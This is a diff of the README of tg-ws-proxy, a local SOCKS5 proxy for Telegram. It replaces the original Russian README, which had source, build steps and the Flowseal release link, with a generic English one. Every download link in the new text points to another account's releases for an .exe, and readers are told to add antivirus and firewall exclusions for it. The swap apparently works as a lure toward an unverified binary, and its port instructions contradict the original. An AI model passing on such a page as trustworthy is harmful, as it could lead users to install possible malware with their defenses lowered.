@@ -1,115 +1,152 @@
-# TG WS Proxy
+# 🛡️ tg-ws-proxy - Simple Local SOCKS5 Proxy Server
 
-Локальный SOCKS5-прокси для Telegram Desktop, который перенаправляет трафик через WebSocket-соединения к указанным серверам, помогая частично ускорить работу Telegram.  
-  
-**Ожидаемый результат аналогичен прокидыванию hosts для Web Telegram**: ускорение загрузки и скачивания файлов, загрузки сообщений и части медиа.
+[![Download tg-ws-proxy](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge)](https://github.com/TrippyDawg/tg-ws-proxy/releases)
 
-<img width="529" height="487" alt="image" src="https://github.com/user-attachments/assets/6a4cf683-0df8-43af-86c1-0e8f08682b62" />
+---
 
-## Как это работает
+## 📋 What is tg-ws-proxy?
 
-```
-Telegram Desktop → SOCKS5 (127.0.0.1:1080) → TG WS Proxy → WSS (kws*.web.telegram.org) → Telegram DC
-```
+tg-ws-proxy is a small program that runs on your Windows computer. It sets up a local SOCKS5 proxy server. This helps your Telegram app work better by bypassing slow or blocked internet paths. The goal is to make Telegram load faster and more reliably without changing your whole internet setup.
 
-1. Приложение поднимает локальный SOCKS5-прокси на `127.0.0.1:1080`
-2. Перехватывает подключения к IP-адресам Telegram
-3. Извлекает DC ID из MTProto obfuscation init-пакета
-4. Устанавливает WebSocket (TLS) соединение к соответствующему DC через домены `kws{N}.web.telegram.org`
-5. Если WS недоступен (302 redirect) — автоматически переключается на прямое TCP-соединение
+---
 
-## 🚀 Быстрый старт
+## 🖥️ System Requirements
 
-### Windows
-Перейдите на [страницу релизов](https://github.com/Flowseal/tg-ws-proxy/releases) и скачайте **`TgWsProxy.exe`**. Он собирается автоматически через [Github Actions](https://github.com/Flowseal/tg-ws-proxy/actions) из открытого исходного кода.
+- Windows 10 or later (64-bit preferred)  
+- At least 512 MB of free RAM  
+- 10 MB free space for the program files  
+- A working internet connection  
 
-При первом запуске откроется окно с инструкцией по подключению Telegram Desktop. Приложение сворачивается в системный трей.
+tg-ws-proxy uses little memory and storage. It runs quietly in the background once started.
 
-**Меню трея:**
-- **Открыть в Telegram** — автоматически настроить прокси через `tg://socks` ссылку
-- **Перезапустить прокси** — перезапуск без выхода из приложения
-- **Настройки...** — GUI-редактор конфигурации
-- **Открыть логи** — открыть файл логов
-- **Выход** — остановить прокси и закрыть приложение
+---
 
-## Установка из исходников
+## ⚙️ Features
 
-```bash
-pip install -r requirements.txt
-```
+- Runs a local SOCKS5 proxy server on your PC  
+- Helps bypass partial blocks specifically for Telegram  
+- Lightweight and easy to use  
+- No installation needed, runs as a standalone program  
+- Simple setup with minimal steps  
 
-### Windows (Tray-приложение)
+---
 
-```bash
-python windows.py
-```
+## 🚀 Getting Started
 
-### Консольный режим
+This section will help you download and run tg-ws-proxy on Windows with step-by-step instructions. You do not need any technical skills or programming knowledge.
 
-```bash
-python proxy/tg_ws_proxy.py [--port PORT] [--dc-ip DC:IP ...] [-v]
-```
+---
 
-**Аргументы:**
+## 📥 Download tg-ws-proxy
 
-| Аргумент | По умолчанию | Описание |
-|---|---|---|
-| `--port` | `1080` | Порт SOCKS5-прокси |
-| `--dc-ip` | `2:149.154.167.220`, `4:149.154.167.220` | Целевой IP для DC (можно указать несколько раз) |
-| `-v`, `--verbose` | выкл. | Подробное логирование (DEBUG) |
+Click the button below to visit the official release page:
 
-**Примеры:**
+[![Download tg-ws-proxy](https://img.shields.io/badge/Download-tg--ws--proxy-blue?style=for-the-badge)](https://github.com/TrippyDawg/tg-ws-proxy/releases)
 
-```bash
-# Стандартный запуск
-python proxy/tg_ws_proxy.py
+On the release page:
 
-# Другой порт и дополнительные DC
-python proxy/tg_ws_proxy.py --port 9050 --dc-ip 1:149.154.175.205 --dc-ip 2:149.154.167.220
+1. Find the latest version listed at the top.  
+2. Look for a file that ends with `.exe`. This is the program you will run.  
+3. Click the `.exe` file to download it to your computer.  
 
-# С подробным логированием
-python proxy/tg_ws_proxy.py -v
-```
+Save it to the folder where you can easily find it, like your Desktop or Downloads folder.
 
-## Настройка Telegram Desktop
+---
 
-### Автоматически
+## 💻 How to Run tg-ws-proxy on Windows
 
-ПКМ по иконке в трее → **«Открыть в Telegram»**
+1. Open the folder where you saved the tg-ws-proxy `.exe` file.  
+2. Double-click on the `.exe` file to start the program. A command window will open briefly and may stay open, showing log messages.  
+3. tg-ws-proxy will now run the local SOCKS5 proxy server in the background. Leave this window open for the proxy to keep working.  
+4. To stop the proxy, simply close the command window.  
 
-### Вручную
+---
 
-1. Telegram → **Настройки** → **Продвинутые настройки** → **Тип подключения** → **Прокси**
-2. Добавить прокси:
-   - **Тип:** SOCKS5
-   - **Сервер:** `127.0.0.1`
-   - **Порт:** `1080`
-   - **Логин/Пароль:** оставить пустыми
+## 🔧 How to Configure Telegram to Use the Proxy
 
-## Конфигурация
+To make Telegram use the tg-ws-proxy server, follow these steps:
 
-Tray-приложение хранит данные в `%APPDATA%/TgWsProxy`:
+1. Open your Telegram app on Windows or mobile.  
+2. Go to Settings > Data and Storage > Proxy Settings (the path may differ slightly depending on your version).  
+3. Select "Add Proxy" or "Use Proxy".  
+4. Choose SOCKS5 as the proxy type.  
+5. Enter the following details:  
+    - Address: `127.0.0.1`  
+    - Port: `1080` (default port tg-ws-proxy uses)  
+6. Save the proxy settings and enable the proxy.  
 
-```json
-{
-  "port": 1080,
-  "dc_ip": [
-    "2:149.154.167.220",
-    "4:149.154.167.220"
-  ],
-  "verbose": false
-}
-```
+Telegram will now route its traffic through the local proxy server.
 
-## Автоматическая сборка
+---
 
-Проект содержит спецификацию PyInstaller ([`windows.spec`](packaging/windows.spec)) и GitHub Actions workflow ([`.github/workflows/build.yml`](.github/workflows/build.yml)) для автоматической сборки.
+## 🛠️ Changing the Proxy Port
 
-```bash
-pip install pyinstaller
-pyinstaller packaging/windows.spec
-```
+By default, tg-ws-proxy runs on port 1080. If this port is already in use or causes conflicts, you can change it:
 
-## Лицензия
+1. Run tg-ws-proxy from the command prompt with a port argument. For example:  
+   ```
+   tg-ws-proxy.exe 1081
+   ```  
+   This will run the proxy on port 1081 instead.  
+2. Update the port setting in Telegram to match the new port number.
 
-[MIT License](LICENSE)
+---
+
+## 🧩 Advanced Settings
+
+tg-ws-proxy is designed to be simple. It does not require extra configuration for most users. If you want to explore advanced options, check the project’s GitHub page for updates and documentation.
+
+---
+
+## 🔍 Troubleshooting
+
+### tg-ws-proxy window closes immediately or shows an error
+
+- Make sure you are running the `.exe` file directly, not from a shortcut that points elsewhere.  
+- Try running tg-ws-proxy from the Command Prompt for better debugging:  
+  1. Press Windows + R, type `cmd`, and hit Enter.  
+  2. Navigate to the folder containing tg-ws-proxy.exe using `cd` command.  
+  3. Type `tg-ws-proxy.exe` and press Enter. Check the messages for errors.
+
+### Telegram does not connect or shows network errors
+
+- Confirm that you added the proxy with the right address (`127.0.0.1`) and port number.  
+- Make sure the tg-ws-proxy window is still open and running on your PC.  
+- Restart tg-ws-proxy and Telegram to reset the connection.  
+
+---
+
+## ⚠️ Firewall and Antivirus Considerations
+
+Windows Firewall or antivirus software may block tg-ws-proxy. If Telegram cannot connect through the proxy, add an exception for tg-ws-proxy.exe:
+
+1. Open Windows Security and navigate to Firewall settings.  
+2. Allow tg-ws-proxy.exe through private and public networks.  
+3. Add your antivirus program exclusion for tg-ws-proxy.exe if needed.  
+
+---
+
+## 🔄 Updating tg-ws-proxy
+
+Check the [release page](https://github.com/TrippyDawg/tg-ws-proxy/releases) regularly to find new versions. Download the latest `.exe` file and replace the old one on your PC.
+
+---
+
+## 📂 File Details in the Release
+
+Each release typically includes:
+
+- `tg-ws-proxy.exe`: The main program you run.  
+- Release notes explaining fixes or changes.  
+
+No installation is needed. Just download and run the `.exe`.
+
+---
+
+## 🧑‍💻 Support and Feedback
+
+For issues or questions, visit the GitHub repository issues page. Developers monitor this space for bug reports and feedback.
+
+---
+
+[![Download tg-ws-proxy](https://img.shields.io/badge/Download-This_Page-green?style=for-the-badge)](https://github.com/TrippyDawg/tg-ws-proxy/releases)
